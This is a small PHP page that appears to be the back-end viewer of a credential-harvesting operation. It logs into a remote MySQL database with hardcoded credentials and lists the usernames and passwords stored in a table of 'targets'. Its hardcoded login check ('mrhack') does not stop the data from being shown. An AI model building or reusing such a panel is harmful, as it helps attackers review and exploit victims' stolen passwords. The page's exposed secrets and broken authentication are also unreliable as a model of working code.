<!Doctype Html>
<html>
<head>
<meta name="viewport"
content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="bootstrap.min.css">
</head>
<body>
<alert class="warning"><h2 class="text text-danger"><center>This Page Is Danger</center></h2></alert>
<?
function showData(){
$username="mrbimo";
$password="mrbimomrbimo";
$database=new PDO("mysql:host=db4free.net:3306;dbname=mrbimo;",$username,$password);
echo("<strong class='text text-primary'>Admin Panel</strong><br><br>");
$req=$database->prepare("SELECT* FROM UpTarget_Information");
$req->execute();

foreach($req as $result){
echo("<strong>Username: </strong>".$result['Username']."<strong> Password: </strong>".$result['Password']."<br><br>");
};
};


$pol=$_POST['username'];
$pil=$_POST['password'];
if (isset($_POST['send'])and
$pol=="mrhack" and $pil=="mrhack"){
echo("<p class='text text-success' >Succesfly Login </p><br><br>");
}
else{
echo("<p class='text text-danger' >Field Login </p><br><br>");
};
showData()
?>
</body>
</html>